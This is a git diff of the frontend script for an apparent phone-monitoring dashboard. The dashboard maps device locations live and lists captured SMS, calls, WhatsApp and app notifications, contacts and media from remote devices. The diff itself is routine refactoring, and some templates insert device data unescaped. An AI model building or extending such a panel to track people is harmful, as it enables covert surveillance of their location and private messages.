@@ -1,4 +1,4 @@
-// public/main.js - atualizado com mapa, socket, icons, downloads, hard reset, calls, streaming
+// main.js - frontend with socket, map, sections
 const API_BASE = '/api';
 const tokenKey = 'monitor_jwt';
 const userKey = 'monitor_user';
@@ -30,16 +30,16 @@ const api = {
     }
     return res.json();
   },
-  // no topo de main.js, substitui download por:
-download: async (path, token) => {
-  const res = await fetch(API_BASE + path, { headers: { Authorization: 'Bearer ' + token }});
-  if (!res.ok) {
-    const txt = await res.text().catch(()=>'<no body>');
-    console.error('download failed', path, res.status, txt);
-    throw new Error('download failed: ' + res.status + ' ' + txt);
+  download: async (path, token) => {
+    const res = await fetch(API_BASE + path, { headers: { Authorization: 'Bearer ' + token }});
+    if (!res.ok) {
+      const txt = await res.text().catch(()=>'<no body>');
+      console.error('download failed', path, res.status, txt);
+      throw new Error('download failed: ' + res.status + ' ' + txt);
+    }
+    return res.blob();
   }
-  return res.blob();
-                          }
+};
 
 document.getElementById('btnLogin').addEventListener('click', async () => {
   const u = document.getElementById('username').value;
@@ -57,26 +57,17 @@ document.getElementById('btnLogout').addEventListener('click', logout);
 
 function hideAllSections() {
   const ids = ['map','devicesSection','contactsSection','messagesSection','notifsSection','mediaSection','callsSection','historySection'];
-  ids.forEach(id => { const el = document.getElementById(id); if (el) el.classList.add('hidden'); });
+  ids.forEach(id => { const el = document.getElementById(id); if (el) el.classList.add('hidden'); if (id === 'map') el.style.display = 'none'; });
 }
 function showSection(id) {
-  // hide map div when not requested
-  const mapDiv = document.getElementById('map');
-  if (id !== 'historySection') {
-    if (mapDiv) mapDiv.style.display = 'none';
-  }
   hideAllSections();
-  const visible = document.getElementById(id);
-  if (visible) visible.classList.remove('hidden');
-
   if (id === 'historySection') {
-    // show and init map
-    if (mapDiv) {
-      mapDiv.style.display = 'block';
-      setTimeout(()=> { if (map) map.invalidateSize(); }, 200);
-    }
+    const mapDiv = document.getElementById('map'); mapDiv.style.display = 'block';
+    setTimeout(()=> { if (map) map.invalidateSize(); }, 250);
     initMapIfNeeded();
   }
+  const visible = document.getElementById(id);
+  if (visible) visible.classList.remove('hidden');
 }
 
 document.getElementById('iconDevices').addEventListener('click', ()=> { showSection('devicesSection'); loadDevices(); });
@@ -100,14 +91,14 @@ async function initSocket() {
   socket.on('connect', () => { console.log('socket connected'); });
   socket.on('location:new', (loc) => {
     console.log('location:new', loc);
-    if (map) {
-      addLocationToMap(loc);
-    }
+    if (map) addLocationToMap(loc);
     prependHistoryItem(loc);
   });
   socket.on('media:new', (m) => {
-    console.log('media:new', m);
-    loadMedia(); // refresh media list (or append)
+    console.log('media:new', m); loadMedia();
+  });
+  socket.on('notification:new', (n) => {
+    console.log('notification:new', n); loadNotifs();
   });
   socket.on('disconnect', ()=> console.log('socket disconnected'));
 }
@@ -128,8 +119,6 @@ async function loadLocationsToMap() {
   const locs = await api.get('/location', token);
   pathCoords = [];
   if (!Array.isArray(locs)) return;
-  // remove existing layers except tile layer
-  // For simplicity reload map markers and polyline.
   locs.forEach(l => {
     const lat = parseFloat(l.lat), lon = parseFloat(l.lon);
     if (isNaN(lat) || isNaN(lon)) return;
@@ -149,14 +138,12 @@ function addLocationToMap(loc) {
     if (isNaN(lat) || isNaN(lon)) return;
     const mk = L.marker([lat, lon]).addTo(map);
     mk.bindPopup(`<b>${loc.deviceId}</b><br/>${lat.toFixed(5)},${lon.toFixed(5)}<br/>${new Date(loc.timestamp).toLocaleString()}<br/><a target="_blank" href="https://www.google.com/maps/dir/?api=1&destination=${lat},${lon}">Navegar</a>`);
-    pathCoords.push([lat, lon]);
-    polyline.setLatLngs(pathCoords);
+    pathCoords.push([lat, lon]); polyline.setLatLngs(pathCoords);
   } catch (e) { console.error(e); }
 }
 
 function prependHistoryItem(loc) {
-  const el = document.getElementById('historyList');
-  if (!el) return;
+  const el = document.getElementById('historyList'); if (!el) return;
   const li = document.createElement('div');
   li.innerHTML = `<b>${loc.deviceId}</b> ${new Date(loc.timestamp).toLocaleString()} — ${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)} <a target="_blank" href="https://www.google.com/maps/dir/?api=1&destination=${loc.lat},${loc.lon}">Navegar</a>`;
   el.prepend(li);
@@ -165,8 +152,8 @@ function prependHistoryItem(loc) {
 async function loadDevices() {
   const token = getToken(); if (!token) return;
   const devs = await api.get('/devices', token);
-  const box = document.getElementById('devicesList');
-  box.innerHTML = '';
+  const box = document.getElementById('devicesList'); box.innerHTML = '';
+  if (!devs || devs.length === 0) box.innerHTML = '<div>Nenhum dispositivo registado</div>';
   devs.forEach(d => {
     const el = document.createElement('div');
     const online = d.lastSeen && (Date.now() - new Date(d.lastSeen)) < 120000;
@@ -206,7 +193,7 @@ async function loadNotifs() {
   const token = getToken(); if (!token) return;
   const arr = await api.get('/whatsapp', token);
   const list = document.getElementById('notifList'); list.innerHTML = '';
-  arr.forEach(n => { const li = document.createElement('li'); li.textContent = `${n.sender}: ${n.message} (${new Date(n.timestamp).toLocaleString()})`; list.appendChild(li); });
+  arr.forEach(n => { const li = document.createElement('li'); li.textContent = `${n.packageName}: ${n.message} (${new Date(n.timestamp).toLocaleString()})`; list.appendChild(li); });
 }
 
 async function loadCalls() {
@@ -251,8 +238,7 @@ async function loadMedia() {
 }
 
 async function loadLocationsList() {
-  const token = getToken();
-  if (!token) return;
+  const token = getToken(); if (!token) return;
   const arr = await api.get('/location', token);
   const el = document.getElementById('historyList'); if (!el) return;
   el.innerHTML = '';
@@ -279,7 +265,6 @@ async function render() {
 function showDashboard() {
   showSection('devicesSection');
   render();
-  // keep polling for devices/media/...
   setInterval(() => { loadDevices(); loadMedia(); loadSms(); loadNotifs(); loadCalls(); }, 8000);
 }
 
